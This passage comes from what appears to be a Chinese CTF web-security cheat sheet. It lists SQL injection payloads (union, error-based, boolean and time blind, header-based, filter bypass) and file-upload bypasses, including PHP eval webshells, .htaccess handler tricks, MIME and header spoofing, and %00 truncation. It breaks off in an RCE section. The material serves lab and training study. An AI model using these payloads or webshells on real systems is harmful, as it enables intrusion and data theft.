log</code>命令查看历史记录，通过<code>git diff</code>对比提交版本。</p><h4><span id="备份文件下载">备份文件下载</span></h4><h5><span id="网站源码">网站源码</span></h5><ul><li>思路：网站源码可能放在目录里面，打开即可获取flag</li></ul><h5><span id="bak文件">bak文件</span></h5><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak</p><ul><li>思路：直接使用curl + url 即可访问</li></ul><h5><span id="vim缓存">vim缓存</span></h5><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容  </p><p>以index.php为例：第一次产生的交换文件名为<code>.index.php.swp</code>，再次意外退出后会产生名为 <code>.index.php.swo</code>的交换文件，第三次产生的交换文件则为 <code>.index.php.swn</code></p><ul><li>思路：使用curl访问，或者使用wget下载到本地再查看</li></ul><h5><span id="ds_store">DS_Store</span></h5><figure class="highlight plain"><figcaption><span>是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过```.DS_Store```可以知道这个目录里面所有文件的清单。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 思路：使用curl命令访问&#96;&#96;&#96;.DS_Store&#96;&#96;&#96; 文件即可</span><br><span class="line"></span><br><span class="line">### 密码口令</span><br><span class="line"></span><br><span class="line">#### 弱口令</span><br><span class="line"></span><br><span class="line">- 思路：看到管理系统默认账号为admin，密码先尝试用弱口令密码本攻击，发现无效</span><br><span class="line"></span><br><span class="line">#### 默认口令</span><br><span class="line"></span><br><span class="line">- 思路：靠社会工程的检索能力</span><br><span class="line"></span><br><span class="line">### SQL注入</span><br><span class="line"></span><br><span class="line">#### 整数型</span><br><span class="line"></span><br><span class="line">检查是否存在注入</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sql</span><br><span class="line">xx &#x3D; ? and 1&#x3D;1 # 返回正确</span><br><span class="line">xx &#x3D; ? and 1&#x3D;2 # 返回错误</span><br></pre></td></tr></table></figure><p>猜字段数（x为数字） 得出字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? order by x</span><br></pre></td></tr></table></figure><p>爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,...,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,...,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span></span><br></pre></td></tr></table></figure><p>获得flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx = ? and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,...,<span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> flag.flag</span><br></pre></td></tr></table></figure><p>其中… 的数量为<code>order by x</code>中的x</p><h4><span id="字符型">字符型</span></h4><p>字符型注入要考虑到  引号闭合  和  注释 </p><p>判断注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=1 <span class="comment"># 返回正确</span></span><br><span class="line">?id=1' and 1=2 <span class="comment"># 返回错误</span></span><br></pre></td></tr></table></figure><p>猜字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1' order by 2 <span class="comment"># 返回正确</span></span><br><span class="line">?id=1' order by 3 <span class="comment"># 返回错误</span></span><br></pre></td></tr></table></figure><p>爆数据库名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>()</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'sqli'</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span></span><br></pre></td></tr></table></figure><p>爆字段内容（flag）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(flag) <span class="keyword">from</span> sqli.flag</span><br></pre></td></tr></table></figure><h4><span id="报错注入">报错注入</span></h4><figure class="highlight plain"><figcaption><span>:对[XML](https://so.csdn.net/so/search?q</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;extractvalue(目标xml文档，xml路径)</span><br></pre></td></tr></table></figure><blockquote><p>第一个参数 : 第一个参数可以传入目标xml文档</p><p>第二个参数： xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>可以用 0x5c  (‘)，还可以使用0x7e (~)，使得sql非法</p></blockquote><p>查询数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and extractvalue(1,concat(0x7e,database(),0x7e))</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p>爆数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><p><strong>mid函数</strong></p><blockquote><p>MID()函数用于从文本字段中提取字符。 SELECT MID(column_name,start[,length]) FROM table_name;</p></blockquote><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>column_name</td><td>必需。要提取字符的字段。</td></tr><tr><td>start</td><td>必需。规定开始位置（起始值是 1）。</td></tr><tr><td>length</td><td>可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。</td></tr></tbody></table><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 and extractvalue(1,concat(0x7e,mid((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">16</span>),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,<span class="keyword">mid</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag),<span class="number">17</span>),<span class="number">0x7e</span>))</span><br><span class="line"><span class="comment"># 拼接得到flag</span></span><br></pre></td></tr></table></figure><h4><span id="布尔注入">布尔注入</span></h4><p>只会返回正确或者错误，因此我们需要构造<code>if</code>语句进行注入，手动过程供参考，还是用sqlmap靠谱。</p><ul><li>先猜测数据库长度</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (length(database()))&gt;5 # 结果是error</span><br><span class="line">1 and (length(database()))=4 <span class="comment"># 结果是success</span></span><br></pre></td></tr></table></figure><ul><li>猜测数据库名</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr(database(),1,1))&gt;110 # 可以二分法来确认每个字母</span><br></pre></td></tr></table></figure><ul><li>得到数据库表中数量</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(table_name) <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>得到表名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第一张数据表的第一个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第一张数据表的第二个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第一张数据表的第三个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="comment"># 最后得到表名为news</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第二张数据表的第一个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第二张数据表的第二个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment"># (不断改变范围，把第二张数据表的第三个字母猜解出来)</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="comment"># 最后得到表名为flag</span></span><br></pre></td></tr></table></figure><ul><li>猜测flag表的字段数</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name=<span class="string">'flag'</span>)=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到flag只有一个字段</span></span><br></pre></td></tr></table></figure><ul><li>猜测字段名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name=<span class="string">'flag'</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment">#(不断改变范围，把字段名猜解出来)</span></span><br><span class="line"><span class="comment">#......</span></span><br><span class="line"><span class="comment">#得到字段名也为flag</span></span><br></pre></td></tr></table></figure><ul><li>猜测flag</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 and ascii(substr((<span class="keyword">select</span> * <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> * <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> * <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#......</span></span><br><span class="line"><span class="comment">#这是一个巨大的工作量，所以应该积累到的一个经验是：</span></span><br><span class="line"><span class="comment">#手工盲注特别繁琐，碰到这类题目要会用工具sqlmap</span></span><br></pre></td></tr></table></figure><h4><span id="mysql结构">MySQL结构</span></h4><h4><span id="时间盲注">时间盲注</span></h4><p>原理和布尔盲注差不多，通过返回时间来判断</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((substr(database(),1,1)=<span class="string">'s'</span>),sleep(1),1)</span><br></pre></td></tr></table></figure><h4><span id="cookie注入">cookie注入</span></h4><p>首先通过抓包，发现浏览器返回cookie: id=1</p><p>使用postman进行发包处理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id = 1 order by 3 <span class="comment"># 1和2均可回显，说明数据库有两行</span></span><br><span class="line">id=-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>；<span class="comment"># 查看页面回显位，发现1，2都可以进行回显</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">version</span>(),<span class="keyword">database</span>() <span class="comment"># 开始注入，获取数据库版本和数据库名 </span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'sqli'</span> <span class="comment"># 因为数据库版本大于5.0，所以我们可以通过查询information_schema表来获取表名和列名，获得表名称为gdctsoiitj</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'gdctsoiitj'</span> <span class="comment"># 得到表名后，继续查询列名，获得列名称为zrxzhzkosa</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> zrxzhzkosa,<span class="number">2</span> <span class="keyword">from</span> gdctsoiitj <span class="comment"># 得到列名后，查询数据得到flag，需要注意这题的表名和列名每个环境都不一样</span></span><br></pre></td></tr></table></figure><ul><li><p>为什么id=-1而不是1</p><blockquote><pre><code>1. 经过查阅资料得知，数据库中id的数据类型设置为int（数值类型）就会出现这种情况，如果数据库检查到id的参数并不为数值的话，就会发生类型转换2. 本题ID=1，我想注入的时候就不能再注ID=1了(要查询数据库不存在的结果，否则存在的结果占位显示我们就看不到第二行的数据)3. 用联合查询语句union select语句来注入，从而判断显示位,同时也是判断注入点，此时要先保证之前的数据查不出来才能判断注入位置，不然就会一直在注入当前的数据库，无法注入新的值来判断注入点，之后再union select id=-1数据不存在数据库中，可以看到位置2可以插入SQL语句。</code></pre><p>总结一下：<br>比如字符串’1’会被转换为1</p><p>比如字符串’1”‘会被转换为1</p><p>比如’1 and 1=1’会被识别为1</p><p>比如’1 and 1=2’会被识别为1</p><p>比如’1akbucbdadbaiudadbabdaud’会被识别为1</p><p>比如’23adasuasdai32ansoiha’会被识别为23</p><p>字符串中数字后面的字符可以是任意的，类型转换时都会被忽略，不会对数值有任何的影响</p></blockquote></li><li><p>为什么要用到<code>group_concat</code></p><blockquote><p>因为需要在一行输出所有的结果</p></blockquote></li></ul><h4><span id="ua注入">UA注入</span></h4><ul><li>和cookie注入流程一致</li></ul><h4><span id="referer注入">Referer注入</span></h4><ul><li>和cookie注入流程一致</li></ul><h4><span id="过滤空格">过滤空格</span></h4><p>随着黑客技术的提升，我们开发人员的防护措施也越来越多，为了防止sql注入，开发人员通常会在后台过滤某些非正常用户输入的字符，例如union、select、单引号双引号等等。</p><ul><li>可以通过/**/来代替空格</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 and 1 = 1 <span class="comment"># 发现被过滤了</span></span><br><span class="line">1<span class="comment">/**/</span>and<span class="comment">/**/</span>1<span class="comment">/**/</span>=<span class="comment">/**/</span>1 <span class="comment"># 发现正确，继续构造payload语句，发现等于2时回显错误，说明此题存在过滤空格注入</span></span><br><span class="line">1<span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span>2 <span class="comment"># 查看有几位</span></span><br><span class="line">1<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment"># 发现无回显，需要加负号操作</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment"># 成功发现回显</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">version</span>() <span class="comment"># 发现回显位</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata <span class="comment"># 查看所有数据库</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">'sqli'</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">'sqli'</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name=<span class="string">'lqsyncyuso'</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure><h3><span id="文件上传">文件上传</span></h3><ul><li>tips: MacBook上有个坑，上传隐藏文件时候需要配合命令<code>command+shift+.</code></li></ul><h4><span id="无验证">无验证</span></h4><ol><li>通过Wappalyzer来查看当前页面的基础环境，如中间件，前后端语言等 </li><li>将一句话木马上传到服务器</li></ol><ul><li>php的一句话木马</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@$_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>通过中国蚁剑进行控制，找到flag</li></ol><h4><span id="前端验证">前端验证</span></h4><ul><li>和无验证差不多，唯一的区别是前端检查了我们上传的文件名。</li></ul><ol><li>禁用js来解决</li><li>使用burpsuite，先将一句话木马后缀修改成.png，然后抓包后缀修改成php，从而达到攻击的目的</li></ol><h4><span id="htaccess">.htaccess</span></h4><blockquote><p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p></blockquote><ol><li><p>使用 FilesMatch 命令生成一个.htaccess 文件进行上传，绕过白名单中的漏洞</p><ul><li><p>需要构造.htaccess文件，其中<code>FilesMatch</code> 就是我们要上传的文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> "<span class="attr">payload</span>"&gt;</span></span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>上传一句话木马，名字为FilesMatch设置的<code>payload</code></p></li></ul></li><li><p>使用passthru执行外部命令</p><ul><li>第一步一样是构造.htaccess文件</li><li>第二步，使用passthru执行外部命令</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">passthru(<span class="string">"ls /var/www/"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后通过浏览器访问<code>http://xxxx/upload/payload</code>来执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">passthru(<span class="string">"cat /var/www/html/flag_828011517.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>添加.htaccess文件</p><ul><li>句话的作用是：让jpg文件中的php语句执行，这句语句放到.htaccess文件中，Apache运行的时候会解析这个文件中的配置，检测到这句话以后，jpg文件中的php语句才会执行</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><ul><li>上传一句话木马，以.jpg结尾</li><li>使用蚁剑进行连接</li></ul></li></ol><h4><span id="mime">MIME</span></h4><ul><li>上传php文件，并将content-type改成image/png即可</li></ul><h4><span id="文件头检查">文件头检查</span></h4><p>原理：服务器会检查png的头格式</p><ul><li><p>截图上传文件，通过<code>burpsuite</code>进行代理</p></li><li><p>在图片后面添加一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>修改文件后缀.php</p></li><li><p>使用蚁剑连接</p></li></ul><h4><span id="00截断">00截断</span></h4><p><strong>%00的使用是在路径上</strong></p><p>就是在.php文件后加上%00后接.jpg，这里我们就可以绕过对php文件的过滤。在执行时，%00会把后面的.jpg截断，所以执行的时候他执行的仍然是前面的.php文件。就可以实现我们的马子文件的执行。</p><h4><span id="双写后缀">双写后缀</span></h4><p>原理：服务器会替换后缀’php’-&gt;’’，因此我们只需要拼接后缀为”pphphp”即可</p><h3><span id="rce">RCE</span></h3><h4><span id="eval执行">eval执行</span></h4><p>进入后题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span 